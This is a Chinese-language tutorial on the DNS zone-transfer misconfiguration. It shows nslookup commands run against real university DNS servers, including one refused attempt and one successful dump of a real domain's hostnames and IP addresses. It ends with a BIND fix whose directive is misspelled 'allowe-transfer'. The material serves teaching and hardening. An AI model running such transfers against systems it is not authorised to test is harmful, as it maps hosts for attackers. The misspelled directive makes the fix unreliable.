# DNS zone transfer bug  

--------------------------  

### 0x00 DNS区域传送  
DNS服务器分为：主服务器、备份服务器和缓存服务器。   
域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。     
在主备服务器之间同步数据库，需要使用“DNS域传送”。  

这为运行中的DNS服务提供了一定的冗余度，其目的是为了防止主的域名服务器因意外故障变得不可用时影响到整个域名的解析。一般来说，DNS区域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供一个zone数据库的详细信息，所以说允许不受信任的因特网用户执行DNS区域传送（zone transfer）操作是后果最为严重的错误配置之一。

区域传送漏洞的危害：黑客可以快速的判定出某个特定zone的所有主机，收集域信息，选择攻击目标，找出未使用的IP地址，黑客可以绕过基于网络的访问控制。  

常见DNS记录类型:  

|记录|描述|
|------|-------|
|A|       IP地址记录,记录一个域名对应的IP地址|
|AAAA|    IPv6 地址记录，记录一个域名对应的IPv6地址|
|CNAME|   别名记录，记录一个主机的别名 |
|MX|      电子邮件交换记录，记录一个邮件域名对应的IP地址，如root@xxxx.com|
|NS|      域名服务器记录 ,记录该域名由哪台域名服务器解析|
|PTR|     反向记录，也即从IP地址到域名的一条记录|
|TXT|     记录域名的相关文本信息|



### 0x01 漏洞利用 
利用过程：  

	1) 输入nslookup命令进入交互式shell;
	2) server 命令参数设定查询将要使用的DNS服务器;
	3) ls命令列出某个域中的所有域名;
	4) exit命令退出  
	
失败例子：  

	C:\Users\Administrator>nslookup	DNS request timed out.	    timeout was 2 seconds.	默认服务器:  UnKnown	Address:  10.211.55.1	> server ss2.bjfu.edu.cn	默认服务器:  ss2.bjfu.edu.cn	Address:  202.204.112.67	> ls bjfu.edu.cn	[ss2.bjfu.edu.cn]	*** 无法列出域 bjfu.edu.cn: Query refused	DNS 服务器拒绝将区域 bjfu.edu.cn 传送到您的计算机。如果这不正确，	请检查 IP 地址 202.204.112.67 的 DNS 服务器上 bjfu.edu.cn 的	区域传送安全设置。


成功例子：  

	C:\Users\Administrator>nslookup	默认服务器:  UnKnown	Address:  10.211.55.1	> server ring.cugb.edu.cn	默认服务器:  ring.cugb.edu.cn	Address:  202.204.105.1	> ls cugb.edu.cn	[ring.cugb.edu.cn]	 cugb.edu.cn.                   NS     server = 	ring.cugb.edu.cn	 cugb.edu.cn.                   A      127.0.0.1	 acm                            A      121.194.86.2	 bbs                            A      202.204.105.172	 www.bd                         A      202.204.105.178	 bm                             A      202.204.105.179	 bsbm                           A      202.204.105.17	 bslt                           A      202.204.109.241	 cas                            A      202.204.105.97	 ce                             A      202.204.99.249	 chushi                         A      202.204.105.243	 cj                             A      202.204.96.111	 cms                            A      202.204.105.179	  .
	  .
	  .	 yjsgl                          A      202.204.105.56	 yw                             A      202.204.105.4	 yx                             A      202.204.105.179	 zhsh                           A      202.204.105.198	 zzb                            A      202.204.105.243


### 0x02 解决方法  
区域传送是DNS常用的功能，区域传送的漏洞也不是没有办法解决的，严格限制允许区域传送的主机即可，例如一个主DNS服务器应该只允许它的从DNS服务器执行区域传送的功能。  
针对于bind软件，可以通过allowe-transfer指令来控制，可以作为global选项或者zone选项的一个参数，我们可以使用地址列表如下

	allowe-transfer ｛192.168.1.1; 172.24.123.253;｝;




</br>

--------------------------
References:  
CSDN.LandGrey-不疯魔，不成活 :  <http://blog.csdn.net/c465869935/article/details/53444117>  
51CTO.老徐的私房菜:  <http://laoxu.blog.51cto.com/4120547/1210565/>  
</br>
Author: xx  
Time: 2017.2.21